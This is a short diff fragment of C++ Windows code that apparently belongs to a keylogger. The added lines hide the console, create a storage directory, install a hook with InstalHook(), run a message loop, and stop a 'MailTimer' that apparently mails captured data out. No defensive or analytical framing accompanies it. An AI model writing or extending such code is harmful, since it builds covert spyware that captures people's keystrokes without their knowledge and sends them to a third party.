@@ -16,10 +16,13 @@ int main()
 {
    //disable console screen
     MSG Msg;
+    IO::MKDir(IO::GetOurPath(true));
+    InstalHook();
     while(GetMessage (&Msg, NULL, 0, 0))
     {
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
-
+    MailTimer.Stop();
+    return 0;
 }
